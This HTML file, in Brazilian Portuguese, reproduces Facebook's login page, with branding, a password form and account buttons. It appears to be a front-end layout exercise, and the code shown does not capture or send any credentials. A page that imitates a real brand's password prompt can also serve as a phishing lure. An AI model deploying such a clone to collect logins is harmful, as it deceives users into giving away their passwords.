<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – entre ou cadastre-se</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="container">
        <div class="content-text">
            <h1 class="logo">facebook</h1>
            <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
        </div>

        <div class="content-form">
            <div class="login-card">
                <form id="loginForm">
                    <input type="text" placeholder="E-mail ou telefone" required>
                    <input type="password" placeholder="Senha" required>
                    <button type="submit" class="btn-login">Entrar</button>
                    <a href="#" class="forgot-password">Esqueceu a senha?</a>
                    <hr>
                    <button type="button" class="btn-new-account">Criar nova conta</button>
                </form>
            </div>
        </div>
    </main>
    <script src="script.js"></script>
</body>
</html>
